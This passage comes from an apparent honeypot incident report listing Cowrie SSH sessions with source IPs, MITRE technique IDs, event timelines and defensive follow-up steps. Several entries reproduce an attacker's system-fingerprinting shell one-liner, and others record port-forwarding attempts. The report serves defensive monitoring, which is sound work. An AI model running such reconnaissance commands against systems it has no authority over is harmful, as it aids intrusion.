| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:07:58` | `cowrie.session.connect` |
| `2026-07-10 13:07:58` | `cowrie.client.version` |
| `2026-07-10 13:07:58` | `cowrie.client.kex` |
| `2026-07-10 13:07:59` | `cowrie.login.success` |
| `2026-07-10 13:07:59` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:07:59` | `cowrie.direct-tcpip.data` |
| `2026-07-10 13:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19cc97ae398e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:08 |
| **Last Seen** | 2026-07-10 13:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:08:21` | `cowrie.session.connect` |
| `2026-07-10 13:08:21` | `cowrie.client.version` |
| `2026-07-10 13:08:21` | `cowrie.client.kex` |
| `2026-07-10 13:08:22` | `cowrie.login.success` |
| `2026-07-10 13:08:23` | `cowrie.session.params` |
| `2026-07-10 13:08:23` | `cowrie.command.input` |
| `2026-07-10 13:08:23` | `cowrie.command.input` |
| `2026-07-10 13:08:23` | `cowrie.command.input` |
| `2026-07-10 13:08:23` | `cowrie.command.input` |
| `2026-07-10 13:08:23` | `cowrie.command.input` |
| `2026-07-10 13:08:23` | `cowrie.command.success` |
| `2026-07-10 13:08:23` | `cowrie.command.input` |
| `2026-07-10 13:08:23` | `cowrie.command.input` |
| `2026-07-10 13:08:23` | `cowrie.command.input` |
| `2026-07-10 13:08:23` | `cowrie.command.input` |
| `2026-07-10 13:08:24` | `cowrie.log.closed` |
| `2026-07-10 13:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9325e86aae41

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 13:09 |
| **Last Seen** | 2026-07-10 13:09 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:09:10` | `cowrie.session.connect` |
| `2026-07-10 13:09:11` | `cowrie.client.version` |
| `2026-07-10 13:09:11` | `cowrie.client.kex` |
| `2026-07-10 13:09:17` | `cowrie.login.success` |
| `2026-07-10 13:09:20` | `cowrie.session.params` |
| `2026-07-10 13:09:20` | `cowrie.command.input` |
| `2026-07-10 13:09:22` | `cowrie.log.closed` |
| `2026-07-10 13:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c6c8405ba9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:09 |
| **Last Seen** | 2026-07-10 13:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:09:35` | `cowrie.session.connect` |
| `2026-07-10 13:09:35` | `cowrie.client.version` |
| `2026-07-10 13:09:35` | `cowrie.client.kex` |
| `2026-07-10 13:09:36` | `cowrie.login.success` |
| `2026-07-10 13:09:37` | `cowrie.session.params` |
| `2026-07-10 13:09:37` | `cowrie.command.input` |
| `2026-07-10 13:09:37` | `cowrie.command.input` |
| `2026-07-10 13:09:37` | `cowrie.command.input` |
| `2026-07-10 13:09:37` | `cowrie.command.input` |
| `2026-07-10 13:09:37` | `cowrie.command.input` |
| `2026-07-10 13:09:37` | `cowrie.command.success` |
| `2026-07-10 13:09:37` | `cowrie.command.input` |
| `2026-07-10 13:09:37` | `cowrie.command.input` |
| `2026-07-10 13:09:37` | `cowrie.command.input` |
| `2026-07-10 13:09:37` | `cowrie.command.input` |
| `2026-07-10 13:09:38` | `cowrie.log.closed` |
| `2026-07-10 13:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645e1649dcb6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:10 |
| **Last Seen** | 2026-07-10 13:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:10:49` | `cowrie.session.connect` |
| `2026-07-10 13:10:49` | `cowrie.client.version` |
| `2026-07-10 13:10:49` | `cowrie.client.kex` |
| `2026-07-10 13:10:51` | `cowrie.login.success` |
| `2026-07-10 13:10:51` | `cowrie.session.params` |
| `2026-07-10 13:10:51` | `cowrie.command.input` |
| `2026-07-10 13:10:51` | `cowrie.command.input` |
| `2026-07-10 13:10:51` | `cowrie.command.input` |
| `2026-07-10 13:10:51` | `cowrie.command.input` |
| `2026-07-10 13:10:51` | `cowrie.command.input` |
| `2026-07-10 13:10:51` | `cowrie.command.success` |
| `2026-07-10 13:10:51` | `cowrie.command.input` |
| `2026-07-10 13:10:51` | `cowrie.command.input` |
| `2026-07-10 13:10:51` | `cowrie.command.input` |
| `2026-07-10 13:10:51` | `cowrie.command.input` |
| `2026-07-10 13:10:52` | `cowrie.log.closed` |
| `2026-07-10 13:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d060ed14d6a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:12 |
| **Last Seen** | 2026-07-10 13:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:12:04` | `cowrie.session.connect` |
| `2026-07-10 13:12:04` | `cowrie.client.version` |
| `2026-07-10 13:12:04` | `cowrie.client.kex` |
| `2026-07-10 13:12:05` | `cowrie.login.success` |
| `2026-07-10 13:12:06` | `cowrie.session.params` |
| `2026-07-10 13:12:06` | `cowrie.command.input` |
| `2026-07-10 13:12:06` | `cowrie.command.input` |
| `2026-07-10 13:12:06` | `cowrie.command.input` |
| `2026-07-10 13:12:06` | `cowrie.command.input` |
| `2026-07-10 13:12:06` | `cowrie.command.input` |
| `2026-07-10 13:12:06` | `cowrie.command.success` |
| `2026-07-10 13:12:06` | `cowrie.command.input` |
| `2026-07-10 13:12:06` | `cowrie.command.input` |
| `2026-07-10 13:12:06` | `cowrie.command.input` |
| `2026-07-10 13:12:06` | `cowrie.command.input` |
| `2026-07-10 13:12:07` | `cowrie.log.closed` |
| `2026-07-10 13:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af70e31f702d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:13 |
| **Last Seen** | 2026-07-10 13:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:13:18` | `cowrie.session.connect` |
| `2026-07-10 13:13:18` | `cowrie.client.version` |
| `2026-07-10 13:13:18` | `cowrie.client.kex` |
| `2026-07-10 13:13:19` | `cowrie.login.success` |
| `2026-07-10 13:13:20` | `cowrie.session.params` |
| `2026-07-10 13:13:20` | `cowrie.command.input` |
| `2026-07-10 13:13:20` | `cowrie.command.input` |
| `2026-07-10 13:13:20` | `cowrie.command.input` |
| `2026-07-10 13:13:20` | `cowrie.command.input` |
| `2026-07-10 13:13:20` | `cowrie.command.input` |
| `2026-07-10 13:13:20` | `cowrie.command.success` |
| `2026-07-10 13:13:20` | `cowrie.command.input` |
| `2026-07-10 13:13:20` | `cowrie.command.input` |
| `2026-07-10 13:13:20` | `cowrie.command.input` |
| `2026-07-10 13:13:20` | `cowrie.command.input` |
| `2026-07-10 13:13:21` | `cowrie.log.closed` |
| `2026-07-10 13:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c7322a4918c

| Field | Detail |
|---|---|
| **Source IP** | `119.202.139[.]244` |
| **First Seen** | 2026-07-10 13:14 |
| **Last Seen** | 2026-07-10 13:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:14:14` | `cowrie.session.connect` |
| `2026-07-10 13:14:15` | `cowrie.client.version` |
| `2026-07-10 13:14:15` | `cowrie.client.kex` |
| `2026-07-10 13:14:18` | `cowrie.login.success` |
| `2026-07-10 13:14:19` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:14:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.202.139[.]244` to AbuseIPDB if not already reported
- [ ] Block `119.202.139[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fab1ef3f3af

| Field | Detail |
|---|---|
| **Source IP** | `116.48.143[.]166` |
| **First Seen** | 2026-07-10 13:14 |
| **Last Seen** | 2026-07-10 13:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:14:28` | `cowrie.session.connect` |
| `2026-07-10 13:14:29` | `cowrie.client.version` |
| `2026-07-10 13:14:29` | `cowrie.client.kex` |
| `2026-07-10 13:14:32` | `cowrie.login.success` |
| `2026-07-10 13:14:33` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.143[.]166` to AbuseIPDB if not already reported
- [ ] Block `116.48.143[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad24c18068d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:14 |
| **Last Seen** | 2026-07-10 13:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:14:34` | `cowrie.session.connect` |
| `2026-07-10 13:14:34` | `cowrie.client.version` |
| `2026-07-10 13:14:34` | `cowrie.client.kex` |
| `2026-07-10 13:14:35` | `cowrie.login.success` |
| `2026-07-10 13:14:36` | `cowrie.session.params` |
| `2026-07-10 13:14:36` | `cowrie.command.input` |
| `2026-07-10 13:14:36` | `cowrie.command.input` |
| `2026-07-10 13:14:36` | `cowrie.command.input` |
| `2026-07-10 13:14:36` | `cowrie.command.input` |
| `2026-07-10 13:14:36` | `cowrie.command.input` |
| `2026-07-10 13:14:36` | `cowrie.command.success` |
| `2026-07-10 13:14:36` | `cowrie.command.input` |
| `2026-07-10 13:14:36` | `cowrie.command.input` |
| `2026-07-10 13:14:36` | `cowrie.command.input` |
| `2026-07-10 13:14:36` | `cowrie.command.input` |
| `2026-07-10 13:14:36` | `cowrie.log.closed` |
| `2026-07-10 13:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9eb2e9262b3

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-10 13:14 |
| **Last Seen** | 2026-07-10 13:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:14:52` | `cowrie.session.connect` |
| `2026-07-10 13:14:53` | `cowrie.client.version` |
| `2026-07-10 13:14:53` | `cowrie.client.kex` |
| `2026-07-10 13:14:56` | `cowrie.login.success` |
| `2026-07-10 13:14:56` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d8b81125a1

| Field | Detail |
|---|---|
| **Source IP** | `77.223.122[.]29` |
| **First Seen** | 2026-07-10 13:15 |
| **Last Seen** | 2026-07-10 13:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:15:07` | `cowrie.session.connect` |
| `2026-07-10 13:15:07` | `cowrie.client.version` |
| `2026-07-10 13:15:07` | `cowrie.client.kex` |
| `2026-07-10 13:15:09` | `cowrie.login.success` |
| `2026-07-10 13:15:09` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.223.122[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.223.122[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c2043c05e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:15 |
| **Last Seen** | 2026-07-10 13:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:15:48` | `cowrie.session.connect` |
| `2026-07-10 13:15:48` | `cowrie.client.version` |
| `2026-07-10 13:15:48` | `cowrie.client.kex` |
| `2026-07-10 13:15:49` | `cowrie.login.success` |
| `2026-07-10 13:15:50` | `cowrie.session.params` |
| `2026-07-10 13:15:50` | `cowrie.command.input` |
| `2026-07-10 13:15:50` | `cowrie.command.input` |
| `2026-07-10 13:15:50` | `cowrie.command.input` |
| `2026-07-10 13:15:50` | `cowrie.command.input` |
| `2026-07-10 13:15:50` | `cowrie.command.input` |
| `2026-07-10 13:15:50` | `cowrie.command.success` |
| `2026-07-10 13:15:50` | `cowrie.command.input` |
| `2026-07-10 13:15:50` | `cowrie.command.input` |
| `2026-07-10 13:15:50` | `cowrie.command.input` |
| `2026-07-10 13:15:50` | `cowrie.command.input` |
| `2026-07-10 13:15:51` | `cowrie.log.closed` |
| `2026-07-10 13:15:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0faea1bfc8ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:16 |
| **Last Seen** | 2026-07-10 13:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:16:59` | `cowrie.session.connect` |
| `2026-07-10 13:16:59` | `cowrie.client.version` |
| `2026-07-10 13:16:59` | `cowrie.client.kex` |
| `2026-07-10 13:17:01` | `cowrie.login.success` |
| `2026-07-10 13:17:02` | `cowrie.session.params` |
| `2026-07-10 13:17:02` | `cowrie.command.input` |
| `2026-07-10 13:17:02` | `cowrie.command.input` |
| `2026-07-10 13:17:02` | `cowrie.command.input` |
| `2026-07-10 13:17:02` | `cowrie.command.input` |
| `2026-07-10 13:17:02` | `cowrie.command.input` |
| `2026-07-10 13:17:02` | `cowrie.command.success` |
| `2026-07-10 13:17:02` | `cowrie.command.input` |
| `2026-07-10 13:17:02` | `cowrie.command.input` |
| `2026-07-10 13:17:02` | `cowrie.command.input` |
| `2026-07-10 13:17:02` | `cowrie.command.input` |
| `2026-07-10 13:17:02` | `cowrie.log.closed` |
| `2026-07-10 13:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc178cefa38f

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-10 13:17 |
| **Last Seen** | 2026-07-10 13:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:17:44` | `cowrie.session.connect` |
| `2026-07-10 13:17:44` | `cowrie.client.version` |
| `2026-07-10 13:17:44` | `cowrie.client.kex` |
| `2026-07-10 13:17:47` | `cowrie.login.success` |
| `2026-07-10 13:17:48` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b510d9807e3

| Field | Detail |
|---|---|
| **Source IP** | `41.214.10[.]178` |
| **First Seen** | 2026-07-10 13:17 |
| **Last Seen** | 2026-07-10 13:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:17:53` | `cowrie.session.connect` |
| `2026-07-10 13:17:53` | `cowrie.client.version` |
| `2026-07-10 13:17:53` | `cowrie.client.kex` |
| `2026-07-10 13:17:54` | `cowrie.login.success` |
| `2026-07-10 13:17:55` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.214.10[.]178` to AbuseIPDB if not already reported
- [ ] Block `41.214.10[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a733e13856cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:18 |
| **Last Seen** | 2026-07-10 13:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
